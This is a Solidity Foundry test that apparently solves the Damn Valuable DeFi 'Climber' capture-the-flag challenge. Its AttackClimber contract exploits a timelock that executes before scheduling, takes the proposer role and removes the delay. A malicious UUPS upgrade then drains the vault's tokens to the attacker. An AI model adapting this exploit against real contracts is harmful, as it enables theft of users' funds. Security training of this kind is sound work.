// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import {AccessControl} from "openzeppelin-contracts/access/AccessControl.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";

contract AttackClimber {
    ClimberTimelock internal climberTimelock;
    address internal attacker;

    constructor(ClimberTimelock _climberTimelock, address _attacker) {
        climberTimelock = _climberTimelock;
        attacker = _attacker;
    }

    function attack() external {
        address[] memory targets = new address[](4);
        targets[0] = address(climberTimelock);
        targets[1] = address(climberTimelock);
        targets[2] = address(climberTimelock);
        targets[3] = address(this);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        dataElements[0] = abi.encodeWithSelector(AccessControl.grantRole.selector, keccak256("PROPOSER_ROLE"), address(this));
        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, keccak256("PROPOSER_ROLE"), attacker);
        dataElements[2] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
        dataElements[3] = abi.encodeWithSelector(AttackClimber.scheduleTasks.selector);
        climberTimelock.execute(
            targets,
            values,
            dataElements,
            bytes32(0x0)
        );
    }

    function scheduleTasks() external {
        address[] memory targets = new address[](4);
        targets[0] = address(climberTimelock);
        targets[1] = address(climberTimelock);
        targets[2] = address(climberTimelock);
        targets[3] = address(this);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        dataElements[0] = abi.encodeWithSelector(AccessControl.grantRole.selector, keccak256("PROPOSER_ROLE"), address(this));
        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, keccak256("PROPOSER_ROLE"), attacker);
        dataElements[2] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
        dataElements[3] = abi.encodeWithSelector(AttackClimber.scheduleTasks.selector);
        climberTimelock.schedule(
            targets,
            values,
            dataElements,
            bytes32(0x0)
        );
    }

}

contract TokenSender is UUPSUpgradeable {
    function sweepFunds(address tokenAddress, address toAddress) external {
        IERC20 token = IERC20(tokenAddress);
        require(
            token.transfer(toAddress, token.balanceOf(address(this))),
            "Transfer failed"
        );
    }

    function _authorizeUpgrade(address newImplementation)
        internal
        override
    {}
}

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature(
            "initialize(address,address,address)",
            deployer,
            proposer,
            sweeper
        );
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(
            ClimberVault(address(climberVaultProxy)).getSweeper(),
            sweeper
        );

        assertGt(
            ClimberVault(address(climberVaultProxy))
                .getLastWithdrawalTimestamp(),
            0
        );

        climberTimelock = ClimberTimelock(
            payable(ClimberVault(address(climberVaultProxy)).owner())
        );

        assertTrue(
            climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer)
        );

        assertTrue(
            climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer)
        );

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        
        // Exploit timelock - make attacker a proposer and remove delay
        AttackClimber attackingContract = new AttackClimber(climberTimelock, attacker);
        attackingContract.attack();

        // Propose new implementation that allows attacker to drain tokens
        TokenSender tokenSenderImplementation = new TokenSender();
        address[] memory targets = new address[](1);
        targets[0] = address(climberVaultProxy);
        uint256[] memory values = new uint256[](1);
        bytes[] memory dataElements = new bytes[](1);
        dataElements[0] = abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, address(tokenSenderImplementation));

        climberTimelock.schedule(targets, values, dataElements, 0x0);
        climberTimelock.execute(targets, values, dataElements, 0x0);

        // Now, take the tokens.
        TokenSender compromisedVault = TokenSender(address(climberVaultProxy));
        compromisedVault.sweepFunds(address(dvt), attacker);

        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        /** SUCCESS CONDITIONS */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}
